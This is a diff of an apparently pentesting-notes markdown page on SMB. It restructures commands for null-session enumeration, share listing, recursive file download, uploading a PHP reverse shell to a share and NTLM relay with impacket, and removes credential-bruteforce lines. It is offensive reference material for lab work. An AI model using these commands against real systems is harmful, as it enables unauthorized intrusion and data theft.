@@ -1,188 +1,136 @@
 ---
-icon: database
 description: Server Message Block
+icon: database
 ---
 
 # SMB
 
-## <mark style="color:purple;">Enumeration</mark>
+<details>
 
-{% tabs %}
-{% tab title="smbclient" %}
-## <mark style="color:purple;">Without Credentials</mark>
+<summary><mark style="color:orange;"><strong><code>smbclient</code></strong></mark></summary>
+
+{% hint style="info" %}
+
+
+#### <mark style="color:red;">`Without Credentials`</mark>
 
 {% code title="List Resource list" %}
-```bash
+```sh
 smbclient -L <IP>
 ```
 {% endcode %}
 
 {% code title="List Null session" %}
-```bash
+```sh
 smbclient -N <IP>
 ```
 {% endcode %}
 
+{% code title="List User Share" %}
+```sh
+smbclient //IP/<SHARE> -U <USER>
+```
+{% endcode %}
+
 {% code title="Connect to share" %}
-```bash
+```sh
 smbclient -N \\\\IP\Share
 ```
 {% endcode %}
 
-{% code title="List Resources list + Null session" %}
-```bash
-smbclient -L \\10.10.10.123 -N
-```
-{% endcode %}
-
-{% code title="Upload PHP reverse shell" %}
-```bash
-smbclient -N //10.10.10.123/Development -c 'put cmd.php tokyo.php'
-```
-{% endcode %}
-
 {% code title="Without Credentials" %}
-```
+```sh
 smbclient --no-pass //IP/<Share>
 ```
 {% endcode %}
 
-{% code title="List Share" %}
-```bash
-smbclient //IP/<SHARE> -U <USER>
+{% code title="Resources list + Null session" %}
+```sh
+smbclient -L \\10.10.10.123 -N
 ```
 {% endcode %}
-{% endtab %}
 
-{% tab title="smbmap" %}
-{% code title="Connect to Host" %}
+{% code title="Upload PHP reverse shell" overflow="wrap" %}
+```sh
+smbclient -N //10.10.10.123/Development -c 'put cmd.php tokyo.php
 ```
+{% endcode %}
+{% endhint %}
+
+{% hint style="info" %}
+
+
+#### <mark style="color:red;">`Download a File`</mark>
+
+{% code title="Type this sequence" overflow="wrap" lineNumbers="true" %}
+```sh
+recurse
+prompt
+mget *
+```
+{% endcode %}
+{% endhint %}
+
+</details>
+
+<details>
+
+<summary><mark style="color:purple;"><strong>Enumeration</strong></mark></summary>
+
+{% code title="Nmap Scripts" %}
+```sh
+nmap --script smb-enum-shares.nse -p445 10.10.10.123
+```
+{% endcode %}
+
+{% code title="Metasploit Module" %}
+```sh
+use auxiliary/scanner/smb/smb_enumshares
+```
+{% endcode %}
+
+{% hint style="info" %}
+#### <mark style="color:orange;">**`smbmap`**</mark>
+
+{% code title="Connect to host" %}
+```sh
 smbmap -H <IP>
 ```
 {% endcode %}
 
-{% code title="Connect with credentials" %}
-```bash
+{% code title="Connect with credentials" overflow="wrap" %}
+```sh
 smbmap -H <IP> -d <dns> -u '<user>' -p '<pass>'
 ```
 {% endcode %}
 
 {% code title="List Share" %}
-```
+```sh
 smbmap -H <IP> -r <SHARE>
 ```
 {% endcode %}
-{% endtab %}
+{% endhint %}
 
-{% tab title="crackmapexec" %}
-{% code title="Connect to host" %}
-```bash
-crackmapexec smb <IP>
-```
-{% endcode %}
+</details>
 
-{% code title="List shares" %}
-```bash
-crackmapexec smb <IP> -u '' -p '' --shares
-```
-{% endcode %}
+<details>
 
-{% code title="Full Enumeration" %}
-```bash
-crackmapexec smb <IP> -u <username> -p <password> --allinfo
-```
-{% endcode %}
+<summary><mark style="color:orange;"><strong><code>SAMBA</code></strong></mark></summary>
 
-{% code title="Bruteforce credentials" %}
-```bash
-cracmapexec smb <IP> -u usernames -p passwords
-```
-{% endcode %}
-
-{% code title="Brutefoce RID" %}
-```bash
-crackmapexec smb <IP> -u <USER> -p <PASSWORD> --rid-brute
-```
-{% endcode %}
-
-{% code title="Deep Credential Bruteforce" %}
-```bash
-crackmapexec smb <IP> -u usernames -p passwords --continue-on-success
-```
-{% endcode %}
-
-{% code title="RMU (Remote Management User)" %}
-```bash
-crackmapexec winrm <IP> -u <USER> -p <PASSWORD>
-```
-{% endcode %}
-{% endtab %}
-
-{% tab title="impacket" %}
-{% code title="Connect to server" %}
-```bash
-impacket-smbclient <IP>/user:password@address
-```
-{% endcode %}
-{% endtab %}
-
-{% tab title="smbget" %}
-{% code title="Download file" %}
-```bash
+{% code title="Download file" overflow="wrap" %}
+```sh
 smbget -U <User> smb://IP/<SHARE_LOCATION> / --download
 ```
 {% endcode %}
-{% endtab %}
 
-{% tab title="Metasploit" %}
-{% code title="Select the module" %}
-```bash
-use auxiliary/scanner/smb/smb_enumshares
-```
-{% endcode %}
+</details>
 
-{% code title="Set target" %}
-```bash
-set RHOSTS <target_ip>
-```
-{% endcode %}
+<details>
 
-{% code title="Execute" %}
-```bash
-run
-```
-{% endcode %}
-{% endtab %}
-
-{% tab title="Nmap-Scripts" %}
-```bash
-nmap --script smb-enum-shares.nse -p445 10.10.10.123
-```
-{% endtab %}
-{% endtabs %}
-
-***
-
-## &#x20;<mark style="color:purple;">To download files type this sequence of commands:</mark>
-
-{% stepper %}
-{% step %}
-### <mark style="color:orange;">`recurse`</mark>
-{% endstep %}
-
-{% step %}
-### <mark style="color:orange;">`prompt`</mark>
-{% endstep %}
-
-{% step %}
-### <mark style="color:orange;">`mget *`</mark>
-{% endstep %}
-{% endstepper %}
-
-***
+<summary><mark style="color:orange;"><strong><code>NTLM</code></strong></mark> <mark style="color:purple;"><strong>Relay Attacks</strong></mark></summary>
 
 {% hint style="danger" %}
-## <mark style="color:purple;">NTLM Relay Attacks</mark>
+
 
 {% code title="Capture the Hash" %}
 ```bash
@@ -196,3 +144,5 @@ impacket-ntrlrelayx -tf target.txt -smb2support -c <payload>
 ```
 {% endcode %}
 {% endhint %}
+
+</details>
